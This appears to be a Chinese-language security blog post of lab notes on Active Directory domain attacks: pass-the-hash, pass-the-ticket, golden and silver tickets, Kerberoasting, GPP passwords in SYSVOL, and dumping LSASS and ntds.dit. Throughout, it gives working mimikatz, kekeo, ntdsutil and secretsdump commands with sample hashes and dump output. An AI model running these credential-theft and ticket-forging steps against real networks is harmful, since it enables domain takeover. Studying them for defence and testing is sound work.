<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon3.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon1.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.png?v=5.1.4" color="#222">





  <meta name="keywords" content="Kerberos,笔记,域渗透,hash注入,Golden Ticket,NTDS.dit," />





  <link rel="alternate" href="/atom.xml" title="Sparrow's Blog" type="application/atom+xml" />






<meta name="description" content="…..">
<meta name="keywords" content="Kerberos,笔记,域渗透,hash注入,Golden Ticket,NTDS.dit">
<meta property="og:type" content="article">
<meta property="og:title" content="域渗透相关">
<meta property="og:url" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/index.html">
<meta property="og:site_name" content="Sparrow&#39;s Blog">
<meta property="og:description" content="…..">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/Kerberos.png">
<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/pass-the-ticket.png">
<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/Golden_Ticket1.png">
<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/Golden_Ticket2.png">
<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/getspn.png">
<meta property="og:updated_time" content="2018-03-28T10:00:32.335Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="域渗透相关">
<meta name="twitter:description" content="…..">
<meta name="twitter:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/Kerberos.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://sp4rr0w.github.io/2018/02/19/域渗透相关/"/>





  <title>域渗透相关 | Sparrow's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Sparrow's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://sp4rr0w.github.io/2018/02/19/域渗透相关/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Sparrow">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/jacksparrow.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sparrow's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">域渗透相关</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-19T08:10:00-05:00">
                2018-02-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术相关/" itemprop="url" rel="index">
                    <span itemprop="name">技术相关</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/19/域渗透相关/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/02/19/域渗透相关/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/19/域渗透相关/" class="leancloud_visitors" data-flag-title="域渗透相关">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>…..<br><a id="more"></a></p>
<h2 id="Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入"><a href="#Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入" class="headerlink" title="Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )"></a>Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )</h2><p>在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值. </p>
<p>在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。</p>
<p>当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等)</p>
<p>他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的hash值来达到登录的目的。</p>
<p>工具: </p>
<pre><code>a. Metasploit - exploit/windows/smb/psexec (XP,2003)
b. xfreerdp (2012r2 http://www.freebuf.com/articles/system/15757.html Hash传递攻击登陆Windows2012远程桌面)
    微软在2014年发布了KB2871997和KB2928120两个补丁,用来阻止域内主机本地用户的网络登录,本地用户的PTH方式已经死掉
然而 , mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。
c.hash injection 
    mimikatz # privilege::debug
    mimikatz # sekurlsa::pth /user:administrator /domain:workgroup /ntlm:d6e1371929886ec1be0b0cf4b101f289 /run:c:\windows\system32\cmd.exe
(sekurlsa::pth 中的pth 即Pass the Hash)
</code></pre><h2 id="Pass-The-Key-OverPass-the-Hash"><a href="#Pass-The-Key-OverPass-the-Hash" class="headerlink" title="Pass The Key (OverPass-the-Hash)"></a>Pass The Key (OverPass-the-Hash)</h2><p>当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash</p>
<p>也就失去了作用，但是可以通过pass the key的攻击方式获得权限</p>
<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; 获取用户的aes key
mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:用戶a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c&quot; 注入aes key
</code></pre><p>若dir 查看不了服务器 (测试2008r2域服务器) </p>
<p>查看mimikatz的相关资料发现如下信息:</p>
<pre><code>ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.
</code></pre><p>根据提示，尝试在系统安装补丁kb2871997后继续测试<br>安裝 : <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42765" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=42765</a><br>之后可以用\计算机名的方式通过远程共享查看目标机器(ps:这里必须要使用计算机名进行连接，会爆密码错误。  不要用win10测试，win10机器测试会在一分鐘后重啓 ,)<br>(如果获取的散列是NTLM，则Kerberos凭证加密方法是RC4。如果散列加密方法为AES，则Kerberos票使用AES进行的加密。)</p>
<h2 id="Pass-the-Ticket-票据传递攻击PtT"><a href="#Pass-the-Ticket-票据传递攻击PtT" class="headerlink" title="Pass the Ticket (票据传递攻击PtT)"></a>Pass the Ticket (票据传递攻击PtT)</h2><p><img src="/2018/02/19/域渗透相关/Kerberos.png" alt="Kerberos.png"><br>与PtH情况类似,但PtT使用的是Kerberos票据,而不是NT哈希</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a></p>
<p>在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性,TGT中并没有关于票据来源的标识信息。</p>
<p>这意味着可以从某台计算机上导出一个有效的TGT,然后导入到该环境中其他的计算机上。</p>
<p>新导入的票据可以用于域的身份认证,并拥有票据中指定用户的权限来访问网络资源。   </p>
<p>这种特别的攻击方法被称为”pass-the-ticket”攻击。</p>
<p><img src="/2018/02/19/域渗透相关/pass-the-ticket.png" alt="pass-the-ticket.png"></p>
<p>拿到了域控权限,在上面就可以很容易的获得krbtgt的Hash值,再通过mimikatz即可生成任意用户任何权限的Ticket,也就是Golden Ticket</p>
<p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p>
<p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo : <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
<p>执行后生成票据<a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a> : </p>
<pre><code>kekeo &quot;tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1&quot;
</code></pre><p>导入票据：</p>
<pre><code>kekeo &quot;kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi&quot;
</code></pre><p>以上3种:</p>
<pre><code>hash传递攻击(PtH):抓住哈希并使用它来访问资源。用户更改帐户密码之前有效。
凭证传递攻击(PtT):抓取Kerberos凭证，并且使用它进行访问资源。攻击有效期是在票证有效期之内(一般为7天)。
超hash传递攻击(OPtH / PtK):使用密码哈希来获取Kerberos凭证。用户更改帐户密码之前，哈希才有效。
</code></pre><h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket (黄金票据)"></a>Golden Ticket (黄金票据)</h2><p>简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。</p>
<p>发生在上面的过程3,可以伪造TGT(前提是获取krbtgt账号的口令散列值(hash))，宣称自己是域内任何账号，包括域管或者不存在的用户。</p>
<p>由來: </p>
<pre><code>Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。
因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过,
理论上讲网络上只有两方能够解密TGT:         
    颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。
    这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。
</code></pre><p>如果攻击者能够攻陷KDC和提取krbtgt散列值(hash)。然后利用这些有限信息,攻击者能够为委托人principal生成任意的TGT。</p>
<blockquote>
<ul>
<li><ol>
<li>首先,黄金票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息,然后处理TGT并颁发服务票据。<br>内存中插入黄金票据并不需要提升权限。而且默认情况下,黄金票据的有效期是10年。</li>
</ol>
</li>
<li><ol>
<li>其次,　黄金票据可以用来绕过当前Kerberos有关加密策略的要求。<br>例如,可以使用DES或RC4加密算法创建一个TGT,即使该域明确支持AES,禁止使用DES或RC4。<br>此情况会产生一个有趣的现象: TGT使用DES加密而服务票据使用AES加密。<br>票据授予服务似乎并不担心TGT,也不拒绝异常行为,因为没有机制让票据授予服务报告关于策略的错误。</li>
</ol>
</li>
<li><ol>
<li>再次,黄金票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求,以确保已禁用的TGT不能用于获得服务票据。<br>然而,该功能的实现存在问题。只有当TGT的寿命超过20分钟时,票据授予服务才会验证TGT的有效性。<br>如果TGT的寿命低于20分钟,票据授予服务将直接颁发服务票据,而不去验证TGT的有效性,默认情况下服务票据具有10小时的有效期。<br>因为攻击者可以利用Mimikatz工具随心所欲的产生票据,所以攻击者只需清除旧的TGT,再替换为寿命少于20分钟的新票据,轻松突破20分钟的限制条件。</li>
</ol>
</li>
<li><ol>
<li>最终,黄金票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据,票据中任何用户都可以是任意组的成员。<br>这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。黄金票据中的用户和SID不必在活动目录中真实存在。<br>也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。</li>
</ol>
</li>
<li>所需条件: <blockquote>
<ul>
<li>krbtgt账户的NT-Hash - 该散列值仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限</li>
<li>域账户名称 - 通常是域管理员”domain admin”</li>
<li>域名</li>
<li>域SID - 可以从域用户的SID或通过sysinternal中psGetsid.exe获得</li>
</ul>
</blockquote>
</li>
<li>简单过程:</li>
<li>清空缓存证书<br>  kerberos::purge  ( or klist purge)</li>
<li>手动创建了一张域管理的黄金票据<br>  kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin</li>
<li>使用这张票据<br>  kerberos::ptt administrator.kirbi.bin<br>  <img src="/2018/02/19/域渗透相关/Golden_Ticket1.png" alt="Golden_Ticket1"></li>
<li>然后我的低权限本地用户，就被提升到域管理权限<br>  kerberos::list</li>
<li>利用dcsync功能获取hash,通过DRSR(目录复制服务DRS远程协议)协议，从域控制器获取任何用户的hash<br>  lsadump::dcsync /domain:demo.local /user:testwin10  (administrator / testwin7)<br>  <img src="/2018/02/19/域渗透相关/Golden_Ticket2.png" alt="Golden_Ticket2"></li>
</ul>
</blockquote>
<h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket (白银票据)"></a>Silver Ticket (白银票据)</h2><p>简义 : 发生在上面的过程5，可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管。</p>
<p>Silver Ticket生成时指定了相关的服务名，因此只能用来访问相应的服务，所以局限性比较大，没有golden ticket好用</p>
<p>所需条件(mimikatz生成silver ticket): </p>
<blockquote>
<ul>
<li>/domain</li>
<li>/sid            ( S-1-5-21-1239069908-882060383-2558203358-500 注意:不要後面的-500  )</li>
<li>/target:域控全称</li>
<li>/service:目标服务器上面的kerberos服务，此处为cifs</li>
<li>/rc4:域控的计算机账户ntlm hash</li>
<li>/user:要伪造的用户名(可以不存在也可是存在的)<br>mimikatz.exe “kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt”即可生成并导入Silver Ticket</li>
</ul>
</blockquote>
<p>常用的服务名有以下:</p>
<pre><code>服务名称                    同时需要的服务
WMI                        HOST、RPCSS
PowerShell Remoting        HOST、HTTP
WinRM                    HOST、HTTP
Scheduled Tasks            HOST
Windows File Share        CIFS
LDAP                    LDAP
Windows Remote Server    RPCSS、LDAP、CIFS
</code></pre><p>用法</p>
<pre><code>kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt
(/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM hash
![Silver_Ticket1](域渗透相关/Silver_Ticket1.png)
</code></pre><h2 id="Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><p>简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。</p>
<p>这里会采用一个有效的用户认证票据(TGT)来请求一个或几个运行在服务器上的目标服务票据。</p>
<p>域控不会检测用户是否真正连接到了这些资源上(即使用户可能真的有权限访问)。</p>
<p>域控会在活动目录中查找SPN并且用SPN关联的用户账户把票据进行加密，以此赋予用户访问服务的权限。</p>
<p>请求的Kerbero服务票据的加密类型是 RC4_HMAC_MD5, 这意味着服务账户的NTLM密码哈希会被用来加密服务票据。</p>
<p>所以Kerberoast能够通过尝试不同的NTLM哈希来解开kerberos票据，一旦票据被成功解开，它的密码也就到手了。<br>(获得服务票据不需要提权，同时也不会发送数据到目标机器。)</p>
<pre><code>https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
    python tgsrepcrack.py wordlist.txt sql.kirbi
</code></pre><h2 id="Kerberoasting-Kerberoast攻击的另一种姿势"><a href="#Kerberoasting-Kerberoast攻击的另一种姿势" class="headerlink" title="Kerberoasting - Kerberoast攻击的另一种姿势"></a>Kerberoasting - Kerberoast攻击的另一种姿势</h2><p>我们通常不关心基于主机的SPN，因为计算机的机器帐户密码默认是随机的，每30天更换一次。</p>
<p>但是，请记住，也可以为域用户帐户注册任意的SPN。</p>
<p>一个常见的例子就是一个服务账户管理着多个MSSQL实例;此用户帐户注册的每个MSSQL实例都有一个&lt;MSSQLSvc/HOST:PORT&gt; 这样的SPN，</p>
<p>这个SPN存储在用户的serviceprincipalname属性里.如果我们有一个为域用户帐户注册的任意SPN，</p>
<p>那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证    </p>
<p>注意的是： 任何具有服务主体名称SPN的域用户帐户都可以被该域中任何用户请求该SPN的TGS，</p>
<p>从而允许攻击者离线破解服务帐户的明文密码！这显然取决于一个可破解的服务帐户明文密码的复杂度</p>
<p><strong>老套的”Kerberoasting攻击姿势</strong></p>
<pre><code>给出的利用方法或工具包是使用工具集的组合来请求票证，并从内存中提取(使用Mimikatz)票证，然后将它们转换为可破解的格式。
</code></pre><p>一般来说，整个过程如下：</p>
<pre><code>a. 使用Tim的GetUserSPNS.ps1脚本或者Sean的Find-PSServiceAccounts.ps1脚本或PowerView的&quot;Get-NetUser -SPN&quot;来枚举域帐户的SPN。
枚举域帐户的SPN :  
&gt; * GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
    PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1
        ServicePrincipalName : kadmin/changepw
        Name                 : krbtgt
        SAMAccountName       : krbtgt
        MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local
        PasswordLastSet      : 9/13/2016 11:37:59 AM
        ServicePrincipalName : test/test
        Name                 : testwin10
        SAMAccountName       : testwin10
        MemberOf             :
        PasswordLastSet      : 1/12/2018 3:00:22 PM
&gt; * PowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089
    PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn
        objectsid              : S-1-5-21-1239069908-882060383-2558203358-502
        iscriticalsystemobject : True
        samaccounttype         : 805306368
        objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local
        objectclass            : {top, person, organizationalPerson, user}
        logoncount             : 0
        lastlogon              : 1/1/1601 8:00:00 AM
        serviceprincipalname   : kadmin/changepw
        adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local
        dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}
        distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local
        ....
</code></pre><p><img src="/2018/02/19/域渗透相关/getspn.png" alt="getspn"></p>
<pre><code>b. 请求这些特定的SPN的 TGS可以使用Windows内置的工具setspn.exe或者在PowerShell中调用.NET的
    System.IdentityModel.Tokens.KerberosRequestorSecurityToken类。

c. 使用Mimikatz的kerberos::list/export命令从内存中提取这些票证，并设置可选的base64导出格式。
    然后下载票据，或者将base64编码的票证拖到攻击者的机器上进行解码。
d. 使用Tim的tgsrepcrack.py开始离线破解密码:
    https://raw.githubusercontent.com/nidem/kerberoast/master/tgsrepcrack.py
    pip install requests-kerberos,kerberos-sspi
    import kerberos 改成 import kerberos_sspi as kerberos
        python tgsrepcrack.py dic.txt file.kirbi
   或者使用John the Ripper的kirbi2john.py从原始票证中提取可破解的哈希格式：
        python kirbi2john.py *.kirbi &gt; johnkirb.txt
        john johnkirb.txt --wordlist=dic.txt  
e. xan7r给 Tim的工具集增加了一个分支，他添加了一个autokerberoast.ps1脚本，自动化了上述攻击过程:
https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1
    此外，@ tifkin_写了一个Go语言版本的TGS爆破器，比原来的Python版本要快一些。
</code></pre><h2 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h2><p>在域环境中修改域机器的本地账户密码是个很麻烦的事情</p>
<p>但是微软的GPP(组策略偏好)中提供了一个批量修改本地账户的功能，</p>
<p>可以一次性批量的修改本地账户密码(组策略不仅仅可以用来批量管理密码)。</p>
<p>但是最初却导致了一个问题，就是域管理员在配置GPP的时候，会在SYSVOL这个文件夹中保存当前GPP配置的xml文件，</p>
<p>如果管理员在配置的时候填入了密码，其中就包含了加密了的用户密码(SYSVOL是一个存储域公共文件服务器副本的共享文件夹，</p>
<p>所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。)</p>
<p>一般sysvol文件的位置是 :</p>
<pre><code>\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\
</code></pre><p>其中的groups.xml(Services.xml、ScheduledTasks.xml、Printers.xml、Drives.xml、DataSources.xml)就可能保存了加密后的本地管理账户密码</p>
<p>(ps:这些文件中并不一定存在密码，因为只有当管理员在配置的时候，在界面的密码框中输入密码之后才会保存(設置計劃任務))</p>
<p>我们可以通过这个powershell的脚本进行解密Get-GPPPassword.ps1</p>
<pre><code>(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1)
. .\Get-GPPPassword.ps1
Get-GPPPassword
同样，我们也可以使用Get-GPPPassword.ps1这个脚本在域内自动搜索所有的sysvol中保存的密码并自动解密
</code></pre><p>若获取不到:</p>
<pre><code>a. 使用了LAPS批量管理域内主机本地管理员帐户 (使用ldapsearch来dump域中的LAPS密码 https://www.anquanke.com/post/id/86502)
    即 Local Administrator Password Solution : LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。
b. 域控安装补丁KB2962486
    这个补丁禁止在组策略配置中填入密码
c. 目标不在组策略中使用域控密码
d. 设置了共享文件夹\SYSVOL的访问权限
</code></pre><h2 id="ntds-dit-活动目录的数据库文件"><a href="#ntds-dit-活动目录的数据库文件" class="headerlink" title="ntds.dit (活动目录的数据库文件)"></a>ntds.dit (活动目录的数据库文件)</h2><p>包含有关活动目录域中所有对象的所有信息 及 所有域用户和计算机帐户的密码哈希值。</p>
<p>域控制器(DC)上的ntds.dit文件只能由可以登录到DC的用户访问 。</p>
<p>这些组可以默认登录到域控制器:</p>
<pre><code>    Enterprise Admins (目录林管理员组)
    Domain Admins(域管理员组)
    Administrators(管理员组)
    Backup Operators(备份操作成员)
    Account Operators(账户管理组)
    Print Operators(打印机操作组)
</code></pre><p>不能登录到域控制器可能 : </p>
<pre><code>a. 限制了有权登录到域控制器的组/帐户。
b. 限制了具有完整活动目录权限的组/帐户，特别是服务帐户。
</code></pre><p>若帐户登录了域控制器，首先把所有的登录凭证全部获取到本地:</p>
<pre><code>1. MIMIKATZ从域控上面抓取到所有账户信息:
    mimikatz # lsadump::lsa /inject exit
    or 保存到mimikatz.log:
    mimikatz # log
    mimikatz # privilege::debug
    mimikatz # lsadump::lsa /inject
    ![mimikatz-lsa](域渗透相关/mimikatz-lsa.png)
2.使用MIMIKATZ转储LSASS内存(获取域管理员凭据)
    mimikatz # sekurlsa::minidump c:\temp\lsass.dmp
    mimikatz # sekurlsa::logonpasswords
3. 使用任务管理器转储LSASS内存(获取域管理员凭据)
    一旦LSASS被转储，mimikatz就可以对lsass.dmp进行提取
    右鍵lsass.exe : Create Dump File
4. 用NTDSUTIL创建媒体安装集(IFM) (用于抓取NTDS.DIT文件)
    NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令，并且允许为DCPromo准备IFM集。
    IFM是用于DCPromo命令中”从媒体安装”这一过程的，所以，在配置域控时就不需要通过网络从其他域控拷贝数据。
    并且也会在c:/temp目录下生成的一份NTDS.dit附件。
        ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\windows\temp\temp&quot; q q
    創建了temp目錄，下面会生成 ntds.dit 和 SYSTEM / SECURITY
5. 从NTDS.DIT文件(和注册表系统配置单元)转储活动目录域凭据
    需要 ntds.dit 和 system.hive (由第4步得到)
    https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py (only linux): 
    -&gt; python secretsdump.py -ntds /root/Desktop/temp/Active Directory/ntds.dit -system /root/Desktop/temp/registry/SYSTEM LOCAL
     -&gt; 
        demo.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        OWA2010DC$:1000:aad3b435b51404eeaad3b435b51404ee:aac6185241728f7685c8d50c61573b75:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f65c6984cbfebdc5f17986d07620afb:::
OWA2010$:1103:aad3b435b51404eeaad3b435b51404ee:d51220f5659cd982fb3fbe4169093181:::
or -&gt; https://github.com/zcgonvh/NTDSDumpEx/releases
    NTDSDumpEx.exe -d ntds.dit -o hash.txt -s system.hiv 
